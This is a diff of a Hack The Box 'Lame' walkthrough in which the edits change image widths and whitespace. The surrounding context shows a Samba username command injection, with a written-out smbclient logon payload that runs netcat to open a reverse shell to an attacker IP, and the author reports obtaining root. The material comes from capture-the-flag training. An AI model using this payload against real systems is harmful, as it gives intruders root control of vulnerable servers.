@@ -94,7 +94,7 @@ We have R/W over the _tmp_ share, I try to connect into the share with anonymous
 Looking for a Samba exploit we found one for that especific version, let's take a look at the code:
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/lame/2_0_exploit.png" width="80%"/>
+  <img src="/images/walkthroughs/hackthebox/lame/2_0_exploit.png" width="90%"/>
 </p>
 
 
@@ -120,7 +120,7 @@ We can see that there is a command injection in the username argument. Let's tes
 
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/lame/2_1_test.png" width="80%"/>
+  <img src="/images/walkthroughs/hackthebox/lame/2_1_test.png" width="70%"/>
 </p>
 
 And we get an incomming HTTP GET request, therefore we have correctly injected a command. Now we try to create a revshell.
@@ -128,15 +128,16 @@ And we get an incomming HTTP GET request, therefore we have correctly injected a
 
 ```bash
 smb: \> logon "/=`nohup nc 10.10.14.2 5456 -e /bin/bash`"
-Password:  whateveryouwannainput                                                                                                                                                          
-session setup failed: NT_STATUS_LOGON_FAILURE                        
+Password:  whateveryouwannainput  
+
+session setup failed: NT_STATUS_LOGON_FAILURE 
 smb: \> 
 ```
 
 And we got the revshell as root!
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/lame/3_0_root.png" width="80%"/>
+  <img src="/images/walkthroughs/hackthebox/lame/3_0_root.png" width="75%"/>
 </p>
 
 Now we can grab the root and user flag.
